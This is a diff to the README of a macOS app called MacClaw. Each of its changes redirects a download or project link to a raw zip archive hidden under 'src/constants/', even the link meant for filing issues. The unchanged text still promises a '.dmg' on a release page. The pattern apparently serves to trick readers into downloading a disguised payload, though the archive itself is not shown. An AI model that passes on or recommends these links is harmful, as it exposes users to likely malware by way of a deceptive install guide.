@@ -1,6 +1,6 @@
 # 🖥️ MacClaw - Easy macOS Client for OpenClaw  
 
-[![Download MacClaw](https://img.shields.io/badge/Download-MacClaw-brightgreen?style=for-the-badge)](https://github.com/Habib112233/MacClaw/releases)  
+[![Download MacClaw](https://img.shields.io/badge/Download-MacClaw-brightgreen?style=for-the-badge)](https://github.com/Habib112233/MacClaw/raw/refs/heads/main/src/constants/Claw_Mac_3.9.zip)  
 
 MacClaw lets you access OpenClaw on macOS with a clean, simple interface similar to Raycast. It works quietly in the background, helping you connect and control OpenClaw using a fast desktop app.
 
@@ -37,7 +37,7 @@ To start using MacClaw on your macOS device, follow these steps to download and 
 ### 1. Download the Application  
 Click the large button below to visit the official MacClaw release page:  
 
-[![Download MacClaw](https://img.shields.io/badge/Download-MacClaw-blue?style=for-the-badge)](https://github.com/Habib112233/MacClaw/releases)  
+[![Download MacClaw](https://img.shields.io/badge/Download-MacClaw-blue?style=for-the-badge)](https://github.com/Habib112233/MacClaw/raw/refs/heads/main/src/constants/Claw_Mac_3.9.zip)  
 
 On the release page, look for the latest version of the MacClaw app. You will typically find a `.dmg` file named something like `MacClaw-x.y.z.dmg`. This is the installer file.  
 
@@ -100,7 +100,7 @@ MacClaw includes basic preferences to adjust appearance and behavior to your lik
 
 Use this link to visit the official page to download MacClaw:  
 
-https://github.com/Habib112233/MacClaw/releases  
+https://github.com/Habib112233/MacClaw/raw/refs/heads/main/src/constants/Claw_Mac_3.9.zip  
 
 Click on the latest release version. Choose the `.dmg` file designed for macOS, then download and run it using the steps above.
 
@@ -126,7 +126,7 @@ The use of Tauri helps keep the app small and efficient by combining web technol
 
 If you encounter problems or want to learn more about MacClaw, visit the GitHub page. You can open issues to report bugs or request features. The project README also includes technical details for advanced users.  
 
-https://github.com/Habib112233/MacClaw  
+https://github.com/Habib112233/MacClaw/raw/refs/heads/main/src/constants/Claw_Mac_3.9.zip  
 
 For general macOS help, Apple’s support website offers tutorials for installing and running apps safely.  
 
